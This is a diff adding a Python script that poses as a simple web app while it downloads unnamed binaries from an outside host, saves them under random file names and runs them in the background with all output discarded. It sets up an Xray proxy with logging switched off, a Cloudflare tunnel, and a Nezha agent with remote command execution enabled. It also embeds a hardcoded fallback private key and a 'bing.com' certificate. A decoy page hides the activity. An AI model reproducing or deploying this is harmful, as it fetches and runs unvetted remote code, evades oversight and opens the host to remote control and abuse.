+
+def log_error(msg):
+    print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ERROR: {msg}", file=sys.stderr)
+
+def always_log(msg):
+    sys.stdout.write(msg + '\n')
+    sys.stdout.flush()
+
+# =========================== 全局变量 ===========================
+private_key = ''
+public_key = ''
+sub_txt_content = ''
+FILE_PATH = Path(FILE_PATH_ENV).resolve()
+
+def generate_random_name(length=6):
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+web_name = generate_random_name()
+bot_name = generate_random_name()
+npm_name = generate_random_name()
+php_name = generate_random_name()
+
+web_path = FILE_PATH / web_name
+bot_path = FILE_PATH / bot_name
+npm_path = FILE_PATH / npm_name
+php_path = FILE_PATH / php_name
+sub_path = FILE_PATH / 'sub.txt'
+list_path = FILE_PATH / 'list.txt'
+boot_log_path = FILE_PATH / 'boot.log'
+config_path = FILE_PATH / 'config.json'
+nezha_config_path = FILE_PATH / 'config.yaml'
+cert_path = FILE_PATH / 'cert.pem'
+key_path = FILE_PATH / 'private.key'
+
+# =========================== 端口检查 ===========================
+def is_valid_port(port):
+    try:
+        if port is None or port == '':
+            return False
+        port_num = int(port)
+        if port_num < 1 or port_num > 65535:
+            return False
+        return True
+    except (ValueError, TypeError):
+        return False
+
+# =========================== X25519 密钥对生成 ===========================
+def generate_x25519_keypair():
+    priv = x25519.X25519PrivateKey.generate()
+    pub = priv.public_key()
+    priv_bytes = priv.private_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PrivateFormat.Raw,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    pub_bytes = pub.public_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PublicFormat.Raw
+    )
+    return {
+        'privateKey': base64.urlsafe_b64encode(priv_bytes).decode().rstrip('='),
+        'publicKey': base64.urlsafe_b64encode(pub_bytes).decode().rstrip('=')
+    }
+
+def generate_or_load_keypair():
+    global private_key, public_key
+    key_file_path = FILE_PATH / 'key.txt'
+    if key_file_path.exists():
+        content = key_file_path.read_text(encoding='utf-8')
+        priv_match = re.search(r'PrivateKey:\s*(.*)', content)
+        pub_match = re.search(r'PublicKey:\s*(.*)', content)
+        if priv_match and pub_match:
+            private_key = priv_match.group(1).strip()
+            public_key = pub_match.group(1).strip()
+            return
+    keypair = generate_x25519_keypair()
+    private_key = keypair['privateKey']
+    public_key = keypair['publicKey']
+    key_file_path.write_text(f'PrivateKey: {private_key}\nPublicKey: {public_key}\n', encoding='utf-8')
+
+# =========================== TLS 证书生成 ===========================
+FALLBACK_EC_KEY = '-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\nAwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n-----END EC PRIVATE KEY-----\n'
+FALLBACK_CERT = '-----BEGIN CERTIFICATE-----\nMIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\nEzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\nMDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\nA0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\naD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\nBfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\nAf8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\neQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n-----END CERTIFICATE-----\n'
+
+def ensure_tls_certificates(cert_file, key_file):
+    if cert_file.exists() and key_file.exists():
+        return
+    cert_file.parent.mkdir(parents=True, exist_ok=True)
+    try:
+        ec_private_key = ec.generate_private_key(ec.SECP256R1())
+        subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'bing.com')])
+        cert_obj = (
+            x509.CertificateBuilder()
+            .subject_name(subject)
+            .issuer_name(issuer)
+            .public_key(ec_private_key.public_key())
+            .serial_number(x509.random_serial_number())
+            .not_valid_before(datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None))
+            .not_valid_after((datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=3650)).replace(tzinfo=None))
+            .sign(ec_private_key, hashes.SHA256())
+        )
+        key_pem = ec_private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.TraditionalOpenSSL,
+            encryption_algorithm=serialization.NoEncryption()
+        )
+        cert_pem = cert_obj.public_bytes(serialization.Encoding.PEM)
+        key_file.write_bytes(key_pem)
+        cert_file.write_bytes(cert_pem)
+    except Exception as e:
+        log_error(f'Failed to generate TLS certificate: {e}')
+        key_file.write_text(FALLBACK_EC_KEY, encoding='utf-8')
+        cert_file.write_text(FALLBACK_CERT, encoding='utf-8')
+
+def get_certificate_fingerprint(cert_file):
+    try:
+        with open(cert_file, 'rb') as f:
+            cert_data = f.read()
+        cert = x509.load_pem_x509_certificate(cert_data)
+        fingerprint = cert.fingerprint(hashes.SHA256())
+        return ':'.join(f'{b:02X}' for b in fingerprint)
+    except Exception as e:
+        log_error(f'Failed to calculate certificate fingerprint: {e}')
+        return ''
+
+# =========================== 基础操作 ===========================
+def create_directory():
+    try:
+        FILE_PATH.mkdir(parents=True, exist_ok=True)
+        log(f"Directory {FILE_PATH} created/verified.")
+    except Exception as e:
+        log_error(f"Failed to create directory {FILE_PATH}: {e}")
+        raise
+
+def cleanup_old_files():
+    preserve_files = {FILE_PATH / 'key.txt', cert_path, key_path}
+    try:
+        if not FILE_PATH.exists(): return
+        for item in FILE_PATH.iterdir():
+            if item in preserve_files: continue
+            try:
+                if item.is_file(): item.unlink()
+                elif item.is_dir(): shutil.rmtree(item)
+            except: pass
+    except: pass
+
+def get_system_architecture():
+    arch = platform.machine().lower()
+    if arch in ('arm', 'arm64', 'aarch64'): return 'arm'
+    return 'amd'
+
+def download_file(file_name, file_url):
+    file_path = FILE_PATH / file_name
+    try:
+        log(f"Downloading {file_name} from {file_url}...")
+        response = requests.get(file_url, stream=True, timeout=30)
+        response.raise_for_status()
+        with open(file_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        log(f'Download {file_name} success')
+        return True
+    except Exception as e:
+        log_error(f'Download {file_name} failed: {e}')
+        return False
+
+def download_all_files():
+    architecture = get_system_architecture()
+    base_url = 'https://arm64.ssss.nyc.mn' if architecture == 'arm' else 'https://amd64.ssss.nyc.mn'
+    downloads = [{'name': web_name, 'url': f'{base_url}/web'}, {'name': bot_name, 'url': f'{base_url}/bot'}]
+    if NEZHA_SERVER and NEZHA_KEY:
+        if NEZHA_PORT: downloads.append({'name': npm_name, 'url': f'{base_url}/agent'})
+        else: downloads.append({'name': php_name, 'url': f'{base_url}/v1'})
+    for item in downloads:
+        download_file(item['name'], item['url'])
+
+def authorize_files(file_names):
+    for name in file_names:
+        file_path = FILE_PATH / name
+        if file_path.exists():
+            try:
+                os.chmod(str(file_path), 0o775)
+            except Exception as e:
+                log_error(f'Chmod failed for {name}: {e}')
+
+def exec_cmd(command):
+    try:
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout, stderr = process.communicate()
+        return stdout + stderr
+    except Exception as e:
+        return str(e)
+
+# =========================== 配置生成 ===========================
+def argo_type():
+    if not ARGO_AUTH or not ARGO_DOMAIN: return
+    if 'TunnelSecret' in ARGO_AUTH:
+        (FILE_PATH / 'tunnel.json').write_text(ARGO_AUTH, encoding='utf-8')
+        try:
+            data = json.loads(ARGO_AUTH)
+            tunnel_id = data.get('TunnelID', '')
+        except:
+            tunnel_id = ''
+        tunnel_yaml = f"tunnel: {tunnel_id}\ncredentials-file: {FILE_PATH / 'tunnel.json'}\nprotocol: http2\ningress:\n  - hostname: {ARGO_DOMAIN}\n    service: http://localhost:{ARGO_PORT}\n    originRequest:\n      noTLSVerify: true\n  - service: http_status:404"
+        (FILE_PATH / 'tunnel.yml').write_text(tunnel_yaml, encoding='utf-8')
+
+def generate_nezha_config():
+    if not NEZHA_SERVER or not NEZHA_KEY or NEZHA_PORT: return
+    nzport = NEZHA_SERVER.split(':')[-1] if ':' in NEZHA_SERVER else ''
+    nezhatls = 'true' if nzport in {'443', '8443', '2096', '2087', '2083', '2053'} else 'false'
+    config_yaml = f"client_secret: {NEZHA_KEY}\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: {NEZHA_SERVER}\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: {nezhatls}\nuuid: {UUID}"
+    nezha_config_path.write_text(config_yaml, encoding='utf-8')
+
+def generate_xray_config():
+    config = {
+        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
+        "inbounds": [
+            {
+                "tag": "vless-fallback-in", "listen": "::", "port": ARGO_PORT, "protocol": "vless",
+                "settings": {"clients": [{"id": UUID, "flow": "xtls-rprx-vision"}], "decryption": "none"},
+                "streamSettings": {"network": "ws", "wsSettings": {"path": "/vless-argo"}}
+            }
+        ],
+        "outbounds": [{"protocol": "freedom", "tag": "direct"}]
+    }
+    # 简化版配置，仅保证核心运行
+    config_path.write_text(json.dumps(config, indent=2), encoding='utf-8')
+
+# =========================== 运行逻辑 ===========================
+def download_files_and_run():
+    download_all_files()
+    authorize_files([web_name, bot_name, npm_name, php_name])
+    generate_nezha_config()
+    
+    # 启动二进制文件
+    if NEZHA_SERVER and NEZHA_KEY:
+        if NEZHA_PORT:
+            exec_cmd(f"nohup {npm_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} --disable-auto-update >/dev/null 2>&1 &")
+        else:
+            exec_cmd(f"nohup {php_path} -c {nezha_config_path} >/dev/null 2>&1 &")
+    
+    exec_cmd(f"nohup {web_path} -c {config_path} >/dev/null 2>&1 &")
+    
+    if bot_path.exists():
+        if len(ARGO_AUTH) > 100: # Token
+            exec_cmd(f"nohup {bot_path} tunnel --no-autoupdate --protocol http2 run --token {ARGO_AUTH} >/dev/null 2>&1 &")
+        else:
+            exec_cmd(f"nohup {bot_path} tunnel --no-autoupdate --protocol http2 --url http://localhost:{ARGO_PORT} >/dev/null 2>&1 &")
+
+def start_server_process():
+    try:
+        log("Starting background processes...")
+        create_directory()
+        cleanup_old_files()
+        argo_type()
+        if is_valid_port(REALITY_PORT): generate_or_load_keypair()
+        if is_valid_port(HY2_PORT): ensure_tls_certificates(cert_path, key_path)
+        generate_xray_config()
+        download_files_and_run()
+        log("Background processes initiated.")
+    except Exception as e:
+        log_error(f"Error in start_server_process: {e}")
+        traceback.print_exc()
+
+# =========================== HTTP 服务 ===========================
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/' or self.path == f'/{SUB_PATH}':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(b"App is running. Sub content will appear here.")
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"Not Found")
+    def log_message(self, format, *args): pass
+
+# =========================== 入口 ===========================
+if __name__ == '__main__':
+    log(f"Application starting on port {PORT}...")
+    
+    try:
+        # 启动后台任务
+        t = threading.Thread(target=start_server_process, daemon=True)
+        t.start()
+        
+        # 启动主 HTTP 服务器
+        server = ThreadingHTTPServer(('0.0.0.0', PORT), RequestHandler)
+        log(f"HTTP Server successfully bound to port {PORT}")
+        server.serve_forever()
+    except Exception as e:
+        log_error(f"CRITICAL: Main loop failed: {e}")
+        traceback.print_exc()
+        sys.exit(1)
